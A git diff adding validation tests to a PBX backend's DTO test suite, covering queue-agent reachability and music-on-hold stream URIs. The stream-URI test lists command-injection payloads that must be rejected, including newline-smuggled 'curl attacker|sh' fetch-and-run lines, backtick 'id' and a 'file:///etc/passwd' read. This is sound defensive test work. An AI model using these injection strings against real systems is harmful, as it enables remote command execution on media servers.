@@ -12,6 +12,7 @@ import {
 	updateFeatureCodeDto,
 } from "../../src/pbx/feature-codes/feature-codes.dto";
 import { updateIvrMenuDto } from "../../src/pbx/ivr-menus/ivr-menus.dto";
+import { createMohClassDto } from "../../src/pbx/moh-classes/moh-classes.dto";
 import { createOutboundRouteDto } from "../../src/pbx/outbound-routes/outbound-routes.dto";
 import {
 	createPagingGroupDto,
@@ -445,6 +446,23 @@ describe("pbx DTOs", () => {
 			expect(updateQueueAgentDto.safeParse({ name: "Alice N." }).success).to.equal(true);
 		});
 
+		it("refuses a PATCH that clears the only way to reach the agent", () => {
+			// The admin clears the extension dropdown. This used to save, after which the projection
+			// dropped the seat as `no-extension` and the only symptom was a supervisor noticing one
+			// person stopped getting calls.
+			expect(updateQueueAgentDto.safeParse({ extensionId: null }).success).to.equal(false);
+			expect(updateQueueAgentDto.safeParse({ contact: null }).success).to.equal(false);
+			// Restating the kind is how a seat is moved from one to the other, and it still works.
+			expect(
+				updateQueueAgentDto.safeParse({
+					extensionId: null,
+					contactKind: "external",
+					contact: "+12125550100",
+				}).success,
+			).to.equal(true);
+			expect(updateQueueAgentDto.safeParse({ contact: null, extensionId }).success).to.equal(true);
+		});
+
 		it("takes the queue from the path, never from the tier body", () => {
 			expect(
 				createQueueTierDto.safeParse({ queueAgentId: extensionId, queueId: extensionId }).success,
@@ -540,6 +558,41 @@ describe("pbx DTOs", () => {
 		it("computes totalPages from the window total", () => {
 			expect(paged([1, 2], 7, normalizePagination({ limit: 2 })).totalPages).to.equal(4);
 			expect(paged([], 0, normalizePagination({})).totalPages).to.equal(0);
+		});
+	});
+
+	/**
+	 * `streamUri` becomes an argument to `application=`, which `res_musiconhold` RUNS on the media
+	 * server. `name` has been regex-constrained since the beginning for the much milder reason that a
+	 * `]` breaks the file's syntax; this one is remote command execution.
+	 */
+	describe("music-on-hold stream URI", () => {
+		it("accepts an ordinary http/https stream", () => {
+			expect(
+				createMohClassDto.safeParse({
+					name: "jazz",
+					source: "stream",
+					streamUri: "https://radio.example/stream.mp3?bitrate=128",
+				}).success,
+			).to.equal(true);
+		});
+
+		it("refuses anything that could break out of the generated command line", () => {
+			for (const streamUri of [
+				"http://x\napplication=/bin/sh -c 'curl attacker|sh'",
+				"http://x\r\n[default]",
+				"http://x; curl attacker | sh",
+				"http://x #comment",
+				"http://x`id`",
+				"http://x'y",
+				"file:///etc/passwd",
+				"not a url",
+			]) {
+				expect(
+					createMohClassDto.safeParse({ name: "jazz", source: "stream", streamUri }).success,
+					streamUri,
+				).to.equal(false);
+			}
 		});
 	});
 });
